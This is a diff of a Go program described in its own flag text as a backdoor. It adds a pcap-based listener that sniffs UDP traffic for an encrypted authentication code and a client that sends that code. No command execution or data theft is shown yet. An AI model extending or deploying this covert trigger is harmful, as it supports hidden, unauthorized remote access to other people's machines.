@@ -6,6 +6,8 @@ import(
 	"unsafe"
 	"flag"
 	"fmt"
+	"io"
+	"log"
 	"github.com/google/gopacket/layers"
 	"golang.org/x/crypto/ssh/terminal"
 	"github.com/google/gopacket/pcap"
@@ -24,7 +26,7 @@ func main(){
 		" client or server. Defaults to client.");
 	ipPtr := flag.String("ip", "127.0.0.1", "The ip to connect to if in client mode.");
 	portPtr := flag.Int("port", 80, "The port to connect to in client mode, or to listen on in server mode. Defaults to 80.");
-	interfacePtr := flag.String("iface", eth0, "The interface for the backdoor to monitor for incoming connection, defaults to eth0.");
+	interfacePtr := flag.String("iface", "eth0", "The interface for the backdoor to monitor for incoming connection, defaults to eth0.");
 
 	flag.Parse();
 
@@ -37,7 +39,7 @@ func main(){
 		break;
 	case "server":
 		fmt.Printf("Running in server mode. Listening on %s at port %d\n", GetLocalIP(), *portPtr);
-		intiateServer(*interfacePtr);
+		intiateServer(*interfacePtr, *portPtr);
 	}
 }
 
@@ -56,34 +58,18 @@ func GetLocalIP() string {
     return "";
 }
 
-// func sendKnock(ip String, port int){
-//
-//              ip := &layers.IPv4{
-// 		Version: 4,
-// 		IHL: 5,
-// 		TOS: 0,
-// 		Length: sizeof(struct IPv4) + sizeof(struct TCP),
-// 		Id: 0,
-// 		Flags: 0,
-// 		FragOffset: 0,
-// 		TTL: 255,
-// 		Protocol: IPProtocolUDP,
-// 		Checksum: 0,
-// 		SrcIP: GetLocalIP(),
-// 		DstIP: net.ParseIP(ip),
-// 	}
-// }	
-
 func intiateClient(ip string, port int){
 
-	hostaddr := fmt.Sprintf("%s:%d", ip, port);
-	conn, err := net.Dial("udp", hostaddr);
-	if err != nil {
-		fmt.Printf("Failed to dial server at %s.\n", hostaddr);
-		os.Exit(1);
-	}
+	// hostaddr := fmt.Sprintf("%s:%d", ip, port);
+	// conn, err := net.Dial("udp", hostaddr);
+	// if err != nil {
+	// 	fmt.Printf("Failed to dial server at %s.\n", hostaddr);
+	// 	os.Exit(1);
+	// }
 
-	defer conn.Close();
+	// defer conn.Close();
+	conn, err := net.ListenUDP("udp", &net.UDPAddr{IP: net.IPv4zero, Port: 0})
+	chk(err)
 
 	for {
 		fmt.Print("Please input the authentication code: ");
@@ -92,33 +78,46 @@ func intiateClient(ip string, port int){
 
 		if authstr == passwd {
 			ciphertext := encrypt_data(authstr);
-			fmt.Fprint(conn, "%s", ciphertext);
+			_, err = conn.WriteToUDP([]byte(ciphertext), &net.UDPAddr{IP: net.ParseIP(ip), Port: port})
+			if err != nil {
+				panic(err)
+			}
 			break;
 		}
 		fmt.Print("\nInvalid authentication code, try again.\n");
 	}	
 }
 
-func intiateServer(iface string){
+func intiateServer(iface string, port int){
 
 	if handle, err := pcap.OpenLive(iface, 1600, true, pcap.BlockForever); err != nil {
-		panic(err)
-	} 
-	else if err := handle.SetBPFFilter("udp"); err != nil {  
-		panic(err)
-	} 
-	else {
+		panic(err);
+	} else if err := handle.SetBPFFilter("udp"); err != nil {  
+		panic(err);
+	} else {
 		packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
-		for packet := range packetSource.Packets() {
-			layerpacket := gopacket.NewPacket(packet, layers.LayerTypeEthernet, gopacket.Default)
-			if udpLayer := layerpacket.Layer(layers.LayerTypeUDP); udpLayer != nil {
-				fmt.Println("This is a TCP packet!")
-				tcp, _ := tcpLayer.(*layers.TCP)
+		for {
+			packet, err := packetSource.NextPacket() 
+			if err == io.EOF {
+				break
+			} else if err != nil {
+				log.Println("Error:", err)
+				continue;
+			}
+			if udpLayer := packet.Layer(layers.LayerTypeUDP); udpLayer != nil {;
+				udp, _ := udpLayer.(*layers.UDP);
+				handlePacket(udp, port);
 			}
 			
-			for _, layer := range layerpacket.Layers() {
-				fmt.Println("PACKET LAYER:", layer.LayerType())
-			}
+		}
+	}
+}
+
+func handlePacket(packet *layers.UDP, port int){
+	if port == int(packet.DstPort) {
+		data := decrypt_data([]byte(packet.Payload));
+		if data == passwd {
+			fmt.Printf("Found auth code!");
 		}
 	}
 }
